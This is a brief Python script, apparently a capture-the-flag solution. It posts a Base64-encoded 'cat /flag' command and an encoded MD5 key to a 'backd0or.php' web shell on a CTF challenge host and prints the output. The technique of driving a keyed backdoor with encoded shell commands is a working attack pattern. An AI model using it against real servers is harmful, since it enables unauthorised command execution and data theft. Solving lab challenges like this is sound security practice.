import requests

# 目标PHP脚本的URL
url = "http://eci-2zef47s7mb4xg0ga6s2g.cloudeci1.ichunqiu.com:80/backd0or.php"

# 构造POST请求的数据
data = {
    "cmd": "Y2F0IC9mbGFn",  # Base64编码后的命令
    "key": "ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI="  # MD5哈希
}

# 发送POST请求
response = requests.post(url, data=data)

# 输出响应内容
print(response.text)
